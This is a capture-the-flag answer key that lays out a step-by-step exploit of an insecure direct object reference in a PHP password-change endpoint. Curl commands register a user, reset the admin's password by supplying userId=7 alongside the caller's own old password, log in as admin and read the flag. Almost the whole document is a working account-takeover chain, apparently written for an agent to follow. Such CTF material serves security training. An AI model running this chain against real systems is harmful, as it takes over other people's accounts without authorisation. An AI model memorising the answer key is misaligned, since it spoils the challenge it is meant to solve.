# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: IDOR in the password-change endpoint → account takeover.
`change_password.php` trusts a client-supplied `userId` and only verifies the
*caller's own* old password, so you can reset the admin's (userId 7) password
using your own old password. Then log in as admin to read the flag.

1. **Register and log in** as a normal user (one cookie jar):

   ```
   curl -s -c cookies.txt -X POST "http://<target>/api/register.php" \
     -d "username=attacker1&email=attacker1@x.local&password=Passw0rd!"
   curl -s -c cookies.txt -b cookies.txt -X POST "http://<target>/api/login.php" \
     -d "username=attacker1&password=Passw0rd!"
   ```

2. **IDOR the admin's password** — authenticate with YOUR old password but target
   `userId=7`:

   ```
   curl -s -b cookies.txt -X POST "http://<target>/api/change_password.php" \
     -d "oldPassword=Passw0rd!&newPassword=Hacked123!&confirmPassword=Hacked123!&userId=7"
   ```

3. **Log in as admin** with the new password:

   ```
   curl -s -c admin.txt -X POST "http://<target>/api/login.php" \
     -d "username=admin&password=Hacked123!"
   ```

4. **Read the admin profile** and extract the flag (`FLAG{...}`); report it
   verbatim:

   ```
   curl -s -b admin.txt "http://<target>/profile.php"
   ```
